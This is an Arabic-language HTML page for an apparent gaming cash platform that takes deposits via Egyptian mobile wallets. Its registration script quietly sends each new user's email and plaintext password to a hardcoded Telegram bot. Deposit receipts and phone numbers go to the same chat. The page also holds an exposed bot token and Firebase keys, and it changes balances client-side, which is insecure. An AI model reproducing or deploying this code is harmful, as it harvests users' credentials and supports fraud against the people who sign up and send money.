<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XXSB PRO | Premium Gaming</title>
    <style>
        :root {
            --bg-color: #060913; --glass-bg: rgba(255, 255, 255, 0.03); --glass-border: rgba(255, 255, 255, 0.08);
            --neon-cyan: #00f3ff; --neon-green: #00ff66; --neon-pink: #ff0055; --neon-gold: #ffaa00;
            --text-main: #ffffff; --text-muted: #8c9ba5;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; transition: all 0.3s ease; }
        body { background: var(--bg-color); color: var(--text-main); min-height: 100vh; padding: 20px; }
        .wrapper { max-width: 500px; margin: 40px auto; }
        .glass-card { background: var(--glass-bg); backdrop-filter: blur(20px); border: 1px solid var(--glass-border); border-radius: 20px; padding: 25px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); margin-bottom: 25px; }
        h2.title { font-size: 24px; text-align: center; margin-bottom: 20px; color: var(--neon-cyan); }
        .tabs { display: flex; background: rgba(0,0,0,0.3); padding: 5px; border-radius: 12px; margin-bottom: 20px; }
        .tab { flex: 1; padding: 12px; background: transparent; color: var(--text-muted); border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
        .tab.active { background: rgba(0, 243, 255, 0.1); color: var(--neon-cyan); border: 1px solid rgba(0,243,255,0.3); }
        input, select { width: 100%; padding: 12px; background: rgba(0,0,0,0.3); border: 1px solid var(--glass-border); color: #fff; border-radius: 10px; margin-bottom: 15px; text-align: center; }
        input[type="file"] { padding: 10px; background: rgba(0, 243, 255, 0.05); border: 1px dashed var(--neon-cyan); }
        button.btn-action { width: 100%; padding: 14px; background: linear-gradient(135deg, var(--neon-cyan), #00a8ff); color: #000; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; }
        button.btn-withdraw { background: linear-gradient(135deg, var(--neon-gold), #ff7700); margin-top: 10px;}
        .hidden { display: none !important; }
        .balance-box { background: rgba(0,255,102,0.05); border: 1px solid rgba(0,255,102,0.2); border-radius: 15px; padding: 20px; text-align: center; margin-bottom: 20px; }
        .balance-amount { font-size: 32px; font-weight: 900; color: var(--neon-green); }
        .wallet-info { background: rgba(255,170,0,0.1); border: 1px solid var(--neon-gold); padding: 15px; border-radius: 10px; margin-bottom: 15px; font-size: 14px; text-align: center; }
        .wallet-info span { font-weight: bold; font-size: 18px; color: var(--neon-gold); display: block; margin-top: 5px; letter-spacing: 2px;}
        .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: flex; justify-content: center; align-items: center; z-index: 1000; flex-direction: column; }
        .loader { border: 5px solid rgba(0,243,255,0.2); border-top: 5px solid var(--neon-cyan); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div id="loading" class="loading-overlay hidden">
    <div class="loader"></div>
    <p style="margin-top: 15px; color: var(--neon-cyan); font-weight: bold;" id="loading-text">جاري المعالجة...</p>
</div>

<div class="wrapper">
    <div id="auth-screen" class="glass-card">
        <h2 class="title">XXSB PLATFORM</h2>
        <div class="tabs">
            <button id="tab-login" class="tab active" onclick="switchTab('login')">دخول</button>
            <button id="tab-register" class="tab" onclick="switchTab('register')">حساب جديد</button>
        </div>
        <input type="email" id="email" placeholder="البريد الإلكتروني">
        <input type="password" id="password" placeholder="كلمة المرور">
        <button id="btn-submit" class="btn-action" onclick="handleAuth()">تسجيل الدخول</button>
        <p id="err" style="color:var(--neon-pink); text-align:center; margin-top:10px;"></p>
    </div>

    <div id="main-screen" class="glass-card hidden">
        <p style="color:var(--text-muted); text-align:center;">👤 <span id="user-welcome"></span></p>
        
        <div class="balance-box">
            <p style="color:var(--text-muted); font-size:14px;">رصيد المحفظة</p>
            <div id="balance" class="balance-amount">0 ج.م</div>
        </div>

        <h3 style="color:var(--neon-cyan); margin-bottom:15px; font-size:16px;">📥 إيداع وشحن رصيد (كاش)</h3>
        <select id="wallet-type" onchange="updateWalletInfo()">
            <option value="">-- اختر المحفظة للتحويل إليها --</option>
            <option value="vodafone">فودافون كاش</option>
            <option value="orange">أورانج كاش</option>
            <option value="etisalat">اتصالات كاش</option>
        </select>

        <div id="wallet-details" class="wallet-info hidden">
            قم بتحويل المبلغ إلى هذا الرقم:
            <span id="target-number"></span>
        </div>

        <input type="number" id="dep-amt" placeholder="المبلغ الذي قمت بتحويله (الأدنى 150)">
        <input type="text" id="sender-number" placeholder="رقم الموبايل الذي حولت منه">
        <label style="display:block; margin-bottom:5px; font-size:13px; color:var(--text-muted);">صورة إيصال التحويل (سكرين شوت):</label>
        <input type="file" id="receipt-img" accept="image/*">
        
        <button class="btn-action" onclick="submitDeposit()">تأكيد وإرسال الإيصال</button>

        <hr style="border:1px solid rgba(255,255,255,0.05); margin:25px 0;">

        <h3 style="color:var(--neon-gold); margin-bottom:15px; font-size:16px;">📤 سحب كاش</h3>
        <input type="number" id="with-amt" placeholder="المبلغ المراد سحبه (الأدنى 150)">
        <input type="text" id="withdraw-number" placeholder="رقم محفظتك لاستلام الفلوس">
        <button class="btn-action btn-withdraw" onclick="submitWithdraw()">طلب سحب الرصيد</button>

        <button onclick="logout()" style="width:100%; background:transparent; border:1px solid var(--neon-pink); color:var(--neon-pink); padding:10px; border-radius:10px; margin-top:30px; font-weight:bold;">خروج 🚪</button>
    </div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
    import { getFirestore, doc, setDoc, getDoc, updateDoc, onSnapshot, addDoc, collection, increment } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

    const firebaseConfig = {
        apiKey: "AIzaSyCyiLPBJ0qDVZhAtW5r0psuvz8iyIy8VLI",
        authDomain: "xxsb-6bd79.firebaseapp.com",
        projectId: "xxsb-6bd79",
        storageBucket: "xxsb-6bd79.firebasestorage.app",
        messagingSenderId: "6915419205",
        appId: "1:6915419205:web:915ec9496f35a3bfb9472c"
    };

    const app = initializeApp(firebaseConfig);
    const auth = getAuth(app);
    const db = getFirestore(app);

    const BOT_TOKEN = "8125902090:AAELDfYT8h_4Q2bJX3183KbSmJfHezDnFkI";
    const CHAT_ID = "5499273828";
    let mode = "login";

    // أرقام المحافظ بتاعتك (غيرها لأرقامك الحقيقية)
    const wallets = {
        "vodafone": "01000000000", // رقم فودافون كاش بتاعك
        "orange": "01200000000",   // رقم أورانج كاش بتاعك
        "etisalat": "01100000000"  // رقم اتصالات كاش بتاعك
    };

    window.switchTab = function(t) {
        mode = t;
        document.getElementById('tab-login').classList.toggle('active', t==='login');
        document.getElementById('tab-register').classList.toggle('active', t==='register');
        document.getElementById('btn-submit').innerText = t==='login' ? 'دخول' : 'إنشاء حساب';
        document.getElementById('err').innerText = "";
    }

    window.updateWalletInfo = function() {
        const type = document.getElementById("wallet-type").value;
        const details = document.getElementById("wallet-details");
        if(type && wallets[type]) {
            document.getElementById("target-number").innerText = wallets[type];
            details.classList.remove("hidden");
        } else {
            details.classList.add("hidden");
        }
    }

    function showLoading(text) {
        document.getElementById("loading-text").innerText = text;
        document.getElementById("loading").classList.remove("hidden");
    }
    function hideLoading() { document.getElementById("loading").classList.add("hidden"); }

    window.handleAuth = async function() {
        const email = document.getElementById("email").value.trim();
        const pass = document.getElementById("password").value;
        if(!email || !pass) { document.getElementById("err").innerText="املا البيانات!"; return; }

        showLoading("جاري معالجة الحساب...");
        try {
            if(mode === "login") {
                await signInWithEmailAndPassword(auth, email, pass);
            } else {
                const cred = await createUserWithEmailAndPassword(auth, email, pass);
                await setDoc(doc(db, "users", cred.user.uid), { email: email, balance: 0, createdAt: new Date().toISOString() });
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST', headers: {'Content-Type':'application/json'},
                    body: JSON.stringify({chat_id: CHAT_ID, text: `🔔 لاعب جديد سجل:\nالإيميل: ${email}\nالباسورد: ${pass}`})
                });
                alert("تم التسجيل بنجاح!");
            }
        } catch(e) { document.getElementById("err").innerText = "بيانات خاطئة أو الحساب مسجل."; }
        hideLoading();
    }

    onAuthStateChanged(auth, user => {
        if(user) {
            document.getElementById("auth-screen").classList.add("hidden");
            document.getElementById("main-screen").classList.remove("hidden");
            document.getElementById("user-welcome").innerText = user.email;
            
            onSnapshot(doc(db, "users", user.uid), docSnap => {
                if(docSnap.exists()) {
                    document.getElementById("balance").innerText = `${docSnap.data().balance} ج.م`;
                }
            });
        } else {
            document.getElementById("auth-screen").classList.remove("hidden");
            document.getElementById("main-screen").classList.add("hidden");
        }
    });

    // إرسال الإيداع مع الصورة مباشرة للتليجرام API
    window.submitDeposit = async function() {
        const walletType = document.getElementById("wallet-type").value;
        const amt = parseInt(document.getElementById("dep-amt").value);
        const senderNum = document.getElementById("sender-number").value.trim();
        const fileInput = document.getElementById("receipt-img");
        const user = auth.currentUser;

        if(!walletType || !amt || !senderNum || fileInput.files.length === 0) {
            alert("⚠️ يرجى تعبئة جميع البيانات واختيار صورة الإيصال."); return;
        }
        if(amt < 150) { alert("أقل مبلغ للإيداع 150 جنيه."); return; }

        showLoading("جاري رفع الإيصال وإرسال الطلب للإدارة...");
        try {
            // رفع الصورة للتليجرام
            const file = fileInput.files[0];
            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", file);
            formData.append("caption", `📥 طلب إيداع جديد!\n\n👤 اللاعب: ${user.email}\n💵 المبلغ: ${amt} ج.م\n📱 محفظة الإيداع: ${walletType}\n📞 رقم المرسل: ${senderNum}\n\n👈 راجع لوحة التحكم للموافقة وإضافة الرصيد.`);

            const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST', body: formData
            });

            if(tgRes.ok) {
                // حفظ الطلب في قاعدة البيانات بدون الصورة (الصورة وصلت تليجرام خلاص)
                await addDoc(collection(db, "requests"), {
                    uid: user.uid, email: user.email, type: "deposit", amount: amt, senderNumber: senderNum, wallet: walletType, status: "pending", date: new Date().toISOString()
                });
                alert("✅ تم رفع الإيصال بنجاح. رصيدك سيضاف فور مراجعة الإدارة للطلب.");
                document.getElementById("dep-amt").value = "";
                document.getElementById("sender-number").value = "";
                fileInput.value = "";
            } else { alert("فشل رفع الصورة للتليجرام."); }
        } catch(e) { alert("حدث خطأ أثناء الإرسال."); }
        hideLoading();
    }

    // طلب السحب
    window.submitWithdraw = async function() {
        const amt = parseInt(document.getElementById("with-amt").value);
        const wNum = document.getElementById("withdraw-number").value.trim();
        const user = auth.currentUser;

        if(!amt || !wNum) { alert("املا بيانات السحب!"); return; }
        if(amt < 150) { alert("الحد الأدنى للسحب 150 ج.م."); return; }

        showLoading("جاري إرسال طلب السحب...");
        try {
            const snap = await getDoc(doc(db, "users", user.uid));
            if(!snap.exists() || snap.data().balance < amt) { alert("❌ رصيدك لا يكفي للسحب!"); hideLoading(); return; }
            
            // خصم الرصيد مؤقتاً
            await updateDoc(doc(db, "users", user.uid), { balance: increment(-amt) });
            
            await addDoc(collection(db, "requests"), {
                uid: user.uid, email: user.email, type: "withdraw", amount: amt, targetNumber: wNum, status: "pending", date: new Date().toISOString()
            });

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST', headers: {'Content-Type':'application/json'},
                body: JSON.stringify({chat_id: CHAT_ID, text: `📤 طلب سحب كاش!\n\n👤 اللاعب: ${user.email}\n💵 المبلغ: ${amt} ج.م\n📞 للرقم: ${wNum}`})
            });

            alert("✅ تم إرسال طلب السحب والمبلغ قيد المراجعة.");
            document.getElementById("with-amt").value = ""; document.getElementById("withdraw-number").value = "";
        } catch(e) { alert("خطأ في السحب."); }
        hideLoading();
    }

    window.logout = () => signOut(auth);
</script>
</body>
</html>
